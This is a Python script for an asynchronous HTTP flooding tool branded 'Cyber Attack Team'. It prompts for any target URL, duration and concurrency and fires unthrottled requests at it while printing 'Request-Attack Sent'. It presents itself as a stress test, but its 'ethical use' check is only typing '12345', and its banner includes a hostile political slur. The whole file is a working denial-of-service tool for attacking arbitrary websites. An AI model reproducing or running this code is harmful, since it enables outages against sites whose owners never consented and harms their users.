# -*- coding: utf-8 -*-
#! /usr/bin/python3.11
import os
import logging
import time
import datetime
import asyncio
from collections import Counter
from statistics import mean
from urllib.parse import urlparse
from sys import stdout
import logging
import contextlib

import validators
import aiohttp
from colorama import Fore, Style, init


# Init color & logging
init(autoreset=True)
logging.basicConfig(
    filename='attack.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)


def log_attack_status(message, level='info', print_to_terminal=True):
    if level == 'info':
        logging.info(message)
        if print_to_terminal:
            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
    elif level == 'error':
        logging.error(message)
        if print_to_terminal:
            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
    elif level == 'warning':
        logging.warning(message)
        if print_to_terminal:
            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")

os.system("clear")
os.system(f"\033[103mhttps://github.com/kunfayz6-lab/\033[0m")
print(f"{Fore.LIGHTGREEN_EX}.  FOR an INDEPENDENT PALESTINE..!!")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
print("")
def display_header():
    header_lines = [
f"{Fore.BLACK}{Fore.BLUE}╔═══════════════════════════════════════════════════════════════════════╗",                                                                        
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                         .-----,        .---------------               {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                        /       \  __  /    ----------                 {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                       / /       \(  )/    --------                    {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                      //////     . \/ -   ------                       {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                     //// / //   :    : -----                          {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                    // /   /     '`   ,-----                           {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                   // /  //    / //..\\\                                {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                  //          / //,..,\\\                               {Fore.BLUE}║ ",         
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                                                                       {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}                            ====UU====UU====                           {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.GREEN}{Fore.WHITE}       ╔═════════╗{Fore.GREEN}               //||\\{Fore.YELLOW}{Fore.WHITE}              ╔═════════╗        {Fore.BLUE}║ ",     
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██████████{Fore.WHITE}╝{Fore.GREEN}             ////||\\\\\{Fore.YELLOW}            ██████████{Fore.WHITE}║        {Fore.BLUE}║ ",     
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}║             {Fore.GREEN}          ''``{Fore.YELLOW}                   ██{Fore.WHITE}║            {Fore.BLUE}║ ", 
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}║                      ╔═══════╗{Fore.YELLOW}               ██{Fore.WHITE}║            {Fore.BLUE}║ ",         
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}║{Fore.YELLOW}                      ████████{Fore.WHITE}╚╗{Fore.YELLOW}              ██{Fore.WHITE}║            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}║{Fore.YELLOW}                     ██{Fore.WHITE}║{Fore.YELLOW}      ██{Fore.WHITE}║{Fore.YELLOW}             ██{Fore.WHITE}║            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}║{Fore.YELLOW}                     ██{Fore.WHITE}║{Fore.YELLOW}      ██{Fore.WHITE}║{Fore.YELLOW}             ██{Fore.WHITE}║            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██{Fore.WHITE}╚═══════╗{Fore.YELLOW}             ██{Fore.WHITE}║{Fore.YELLOW}      ██{Fore.WHITE}║{Fore.YELLOW}             ██{Fore.WHITE}║            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}       ██████████{Fore.WHITE}╝{Fore.YELLOW}             ██{Fore.WHITE}╚══════{Fore.YELLOW}██{Fore.WHITE}║{Fore.YELLOW}             ██{Fore.WHITE}╝            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}                               ███████████║                            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}                               ██{Fore.WHITE}║{Fore.YELLOW}      ██{Fore.WHITE}║                            {Fore.BLUE}║ ",
f"{Fore.BLACK}{Fore.BLUE}║{Fore.YELLOW}                               ██{Fore.WHITE}╝{Fore.YELLOW}      ██{Fore.WHITE}╝                            {Fore.BLUE}║ ",                                                                         
f"{Fore.BLACK}{Fore.BLUE}╚═══════════════════════════════════════════════════════════════════════╝ ",
    ]
    for line in header_lines:
        print(line)

    # Versi dan URL
    print(f"{Fore.BLUE}╔{'═' * 70}╗")
    print(f"{Fore.BLUE}{Style.BRIGHT}║{Fore.WHITE}  v.2.0{' ' * 63}{Fore.BLUE}║")
    print(f"{Fore.BLUE}{Style.BRIGHT}║{Fore.CYAN}  Author By: KunFayz{' ' * 50}{Fore.BLUE}║")
    print(f"{Fore.BLUE}╚{'═'  * 70}╝")


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 1:
            stdout.flush()
            stdout.write(f"\r{Fore.BLUE}[*]{Fore.RED} {remaining_time:.2f} {Fore.BLUE} Sec left{' ' * 26}")
            print(f"\r{Fore.RED}[] {Fore.CYAN}C A T {Fore.BLUE}Request-Attack {Fore.WHITE}Sent  \033[103m" +str(url)+ "\033[0m")
            print(f"\r{Fore.WHITE}[] {Fore.YELLOW}C A T \033[7mRequest-Attack\033[0m {Fore.YELLOW}Sent  \033[32m" +str(url)+ "\033[0m")
        else:
            stdout.flush()
            stdout.write(f"\r{Fore.RED}••⟩  {Fore.YELLOW}C A T {Fore.CYAN} Attack has been completed|\n")
            return


def get_user_input(prompt_message):
    print(f"{Fore.WHITE}{' ' * 2}😊 └> {Fore.CYAN}{prompt_message.ljust(64)}")
    return input(f"{Fore.RED}{' ' * 2}💥 └>  {Fore.WHITE}").strip()


def get_target(url: str) -> dict:
    if not validators.url(url):
        log_attack_status(f"URL not valid: {url}", level='error')
        raise ValueError(f"URL not valid: {url}")

    parsed = urlparse(url)
    target = {
        'uri': parsed.path or "/",
        'host': parsed.netloc,
        'scheme': parsed.scheme,
        'port': parsed.netloc.split(":")[1] if ":" in parsed.netloc else ("443" if parsed.scheme == "https" else "80"),
    }
    log_attack_status(f"Target acquired: {target['host']} ({target['scheme']}://{target['host']}:{target['port']}{target['uri']})")
    return target


def build_default_headers(host: str) -> dict:
    return {
        'Host': host,
        'User-Agent': 'L7StressTest/1.0 (+https://example.local)',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }


async def _worker(session: aiohttp.ClientSession, url: str, method: str, end_ts: float,
                  headers: dict | None, payload: bytes | None, rate_limit: float | None) -> dict:
    total = 0
    ok = 0
    by_status = Counter()
    exceptions = Counter()
    latencies = []
    min_interval = (1.0 / rate_limit) if rate_limit and rate_limit > 0 else 0.0
    while time.time() < end_ts:
        t0 = time.perf_counter()
        try:
            async with session.request(method.upper(), url, headers=headers, data=payload) as resp:
                await resp.read()  # consume body to reuse connection
                elapsed = (time.perf_counter() - t0) * 1000.0
                latencies.append(elapsed)
                total += 1
                by_status[str(resp.status)] += 1
                if 200 <= resp.status < 400:
                    ok += 1
        except Exception as e:
            elapsed = (time.perf_counter() - t0) * 1000.0
            latencies.append(elapsed)
            total += 1
            exceptions[type(e).__name__] += 1
        # rudimentary rate limit
        if min_interval:
            to_sleep = min_interval - (time.perf_counter() - t0)
            if to_sleep > 0:
                await asyncio.sleep(to_sleep)
        await asyncio.sleep(0)  # yield
    return {
        'total': total,
        'ok': ok,
        'by_status': by_status,
        'exceptions': exceptions,
        'latencies': latencies,
    }


async def run_stress_test(url: str, duration: int, concurrency: int,
                          method: str = 'GET',
                          rate_limit: float | None = None,
                          headers: dict | None = None,
                          payload: bytes | None = None,
                          timeout_s: int = 10) -> dict:
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=timeout_s, sock_read=timeout_s)
    conn = aiohttp.TCPConnector(limit=0)  # let tasks drive concurrency
    end_ts = time.time() + duration
    async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
        tasks = [
            asyncio.create_task(_worker(session, url, method, end_ts, headers, payload, rate_limit))
            for _ in range(concurrency)
        ]

        async def progress():
            while time.time() < end_ts:
                remaining = max(0, end_ts - time.time())
                stdout.write(f"\r{Fore.BLUE}[*]{Fore.RED} {remaining:6.2f} {Fore.BLUE} Sec left{' ' * 26}")
                stdout.flush()
                # Tambahkan gaya progress seperti countdown asli
                print(f"\r{Fore.RED}[] {Fore.CYAN}C A T {Fore.BLUE}Request-Attack {Fore.WHITE}Sent  \033[103m" +str(url)+ "\033[0m")
                print(f"\r{Fore.WHITE}[] {Fore.YELLOW}C A T \033[7mRequest-Attack\033[0m {Fore.YELLOW}Sent  \033[32m" +str(url)+ "\033[0m")
                await asyncio.sleep(0.5)

        prog_task = asyncio.create_task(progress())
        try:
            results = await asyncio.gather(*tasks)
        finally:
            prog_task.cancel()
            # Suppress cancellation noise from the progress task on shutdown
            with contextlib.suppress(asyncio.CancelledError):
                await prog_task

    # aggregate
    agg = {
        'total': sum(r['total'] for r in results),
        'ok': sum(r['ok'] for r in results),
        'by_status': Counter(),
        'exceptions': Counter(),
        'latencies': [],
    }
    for r in results:
        agg['by_status'].update(r['by_status'])
        agg['exceptions'].update(r['exceptions'])
        agg['latencies'].extend(r['latencies'])
    return agg


def print_summary(url: str, duration: int, concurrency: int, method: str, rate_limit: float | None, summary: dict):
    latencies = summary['latencies']
    avg = mean(latencies) if latencies else 0.0
    p95 = sorted(latencies)[int(0.95 * len(latencies)) - 1] if latencies else 0.0
    p99 = sorted(latencies)[int(0.99 * len(latencies)) - 1] if latencies else 0.0
    rps = summary['total'] / duration if duration > 0 else 0
    # Gaya log penyelesaian seperti file asli
    stdout.write(f"\r{Fore.GREEN}└> {Fore.YELLOW}C A T {Fore.RED} •> {Fore.CYAN} Attack has been completed\n")
    print(f"{Fore.YELLOW}╚{'═' * 45}╝")
    log_attack_status("Test Finish. Summary:")
    print(f"{Fore.YELLOW}└> Target     : {url.ljust(58)}")
    print(f"{Fore.YELLOW}└> Duration   : {str(duration)+'s':<58}")
    print(f"{Fore.YELLOW}└> Concurrency: {str(concurrency):<58}")
    print(f"{Fore.YELLOW}└> Method     : {method:<58}")
    print(f"{Fore.YELLOW}└> Rate limit : {('None' if not rate_limit else str(rate_limit)+' req/s'):<58}")
    print(f"{Fore.MAGENTA}{'••' * 15}")
    print(f"{Fore.GREEN}└> Requests   : {str(summary['total']):<58}")
    print(f"{Fore.GREEN}└> 2xx/3xx    : {str(summary['ok']):<58}")
    print(f"{Fore.GREEN}└> RPS (avg)  : {rps:<58.2f}")
    print(f"{Fore.GREEN}└> Latency ms : avg={avg:.2f} p95={p95:.2f} p99={p99:.2f}{' ' * 20}")
    if summary['by_status']:
        print(f"{Fore.BLUE}{'••' * 15}")
        for code, cnt in summary['by_status'].most_common():
            print(f"{Fore.CYAN}HTTP {code:<4}: {str(cnt):<58}")
    if summary['exceptions']:
        print(f"{Fore.YELLOW}{'••' * 15}")
        for name, cnt in summary['exceptions'].most_common():
            print(f"{Fore.GREEN} {name:<10}: {str(cnt):<58}")
    print(f"{Fore.BLUE}{'••' * 15}")


def confirm_ethical_use(target_host: str) -> bool:
    print(f"{Fore.GREEN}└> WARNING..!! do not attack government websites.")
    print(f"{Fore.GREEN}└> Target: {target_host.ljust(61)}")
    print(f"{Fore.GREEN}└> Type '12345' to continue: {' ' * 35}")
    ans = input("└> ").strip().upper()
    return ans == '12345'


def launch_attack(target_url, duration, concurrency=10, method='GET', rate_limit=None):
    target = get_target(target_url)
    if not confirm_ethical_use(target['host']):
        log_attack_status("Canceled by user for security reasons.", level='warning')
        return

    url = f"{target['scheme']}://{target['host']}{target['uri']}"
    headers = build_default_headers(target['host'])
    log_attack_status(f"Launch attack {target['host']} for {duration} second(s), concurrency={concurrency}...")

    try:
        summary = asyncio.run(
            run_stress_test(
                url=url,
                duration=duration,
                concurrency=concurrency,
                method=method,
                rate_limit=rate_limit,
                headers=headers,
            )
        )
        print_summary(url, duration, concurrency, method, rate_limit, summary)
    except KeyboardInterrupt:
        log_attack_status("Dihentikan (CTRL+C)", level='warning')


if __name__ == "__main__":
    display_header()

    while attemps < 100:
        print(f"{Fore.CYAN}┌[Cyber Attack Team")
        username = input(f"{Fore.CYAN}└> Username please:   \033[31m")
        print(f"{Fore.GREEN}┌[Cyber Attack Team")
        password = input(f"{Fore.GREEN}└> Your password: \033[31m")

        if username == 'tanya' and password == 'janda sebelah':
            
            print(f"\033[103m••••>> FUCKING ZIONIST...!!\033[0m")
            break
        else:
            print('Incorrect credentials. Check if you have Caps lock on and try again.')
            attemps += 1
            continue        

    target_url = get_user_input("URL TARGET:   ")
    while not validators.url(target_url):
        print(f"{Fore.RED}    [ERROR] Invalid URL, try again.{' ' * 37}")
        target_url = get_user_input("URL TARGET:")

    try:
        attack_duration = int(get_user_input("Attack Duration (second):"))
    except ValueError:
        attack_duration = 60

    try:
        concurrency = int(get_user_input("Concurrency (e.g., 10):"))
        if concurrency <= 0:
            concurrency = 10
    except ValueError:
        concurrency = 10

    method = get_user_input("HTTP Method (GET/POST):").upper() or 'GET'
    if method not in {"GET", "POST", "HEAD", "PUT", "DELETE", "PATCH"}:
        method = 'GET'

    rl = get_user_input("Rate limit req/s per worker (blank for none):")
    rate_limit = None
    if rl:
        try:
            rate_limit = float(rl)
        except ValueError:
            rate_limit = None

    launch_attack(target_url, attack_duration, concurrency=concurrency, method=method, rate_limit=rate_limit)
    
